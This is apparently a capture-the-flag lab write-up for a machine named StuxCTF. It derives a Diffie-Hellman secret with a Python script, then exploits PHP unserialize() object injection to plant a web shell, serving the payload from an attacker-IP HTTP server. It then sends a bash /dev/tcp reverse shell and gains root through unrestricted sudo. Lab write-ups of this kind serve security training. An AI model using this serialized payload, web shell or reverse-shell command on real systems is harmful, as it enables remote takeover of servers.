# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.139.158 stuxctf.thm
```


The `/robots.txt` reveals that [Diffie-Hellman](https://dev.to/arnavsharma2711/how-end-to-end-encryption-really-works-understanding-the-diffie-hellman-key-exchange-1b3f) key exchange method was used:

```console
$ curl -s 'http://stuxctf.thm/robots.txt'

# robots.txt generated by StuxCTF
# Diffie-Hellman
User-agent: *
Disallow: 
Disallow: /StuxCTF/
```

Wrote a script `solve.py` to find the secret:

```python
#!/usr/bin/env python3

# Parameters
p = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251
g = 7
a = 330
b = 450
gc = 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617

# Calculations
gca = pow(gc, a, p)
gcab = pow(gca, b, p)
secret = str(gcab)[:128] # First 128 chars because of room hint

print(secret)
```

# Exploitation

Take a deeper look at the PHP source code. If a serialized `file` object is passed to `unserialize()`, an attacker will be able to control `$file` and `$data` variables, writing custom files when `__destruct()` is called:

```php
class file {
	public $file = "dump.txt";
	public $data = "dump test";
	function __destruct(){
		file_put_contents($this->file, $this->data);
	}
}

$file_name = $_GET['file'];

if(isset($file_name) && !file_exists($file_name)){
	echo "File no Exist!";
}

if($file_name=="index.php"){
	$content = file_get_contents($file_name);
	$tags = array("", "");
	echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));
}

unserialize(file_get_contents($file_name));
```

Wrote `gen.php` to create a reverse shell file:

```php
<?php

class file {
	public $file = 'r.php';
	public $data = '<?php echo shell_exec($_GET["cmd"]); ?>';
}

echo serialize(new file);

?>
```

Generate malicious serialized `file.ser` object:

```console
$ php gen.php | tee file.ser

O:4:"file":2:{s:4:"file";s:5:"r.php";s:4:"data";s:39:"<?php echo shell_exec($_GET["cmd"]); ?>";}
```

Waited for connections:

```console
$ sudo ncat -lvnp 443
```

Loaded malicious serialized object:

```console
$ sudo python3 -m http.server 80 &
...

$ curl -s "http://stuxctf.thm/$(python3 solve.py)/?file=http://<ATTACKER-IP>/file.ser"
...

$ cmd=$(urlencode -a <<< "bash -c 'bash -i >& /dev/tcp/192.168.137.46/443 0>&1'")

$ curl -s "http://stuxctf.thm/$(python3 solve.py)/r.php?cmd=$cmd"
```

# Post-Exploitation

Found **user flag**:

```console
$ cat /home/grecia/user.txt
```

Can run any command using `sudo`, so become **root**:

```console
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL

$ sudo su

# whoami
root
```

Get the **root flag**:

```console
# cat /root/root.txt
```
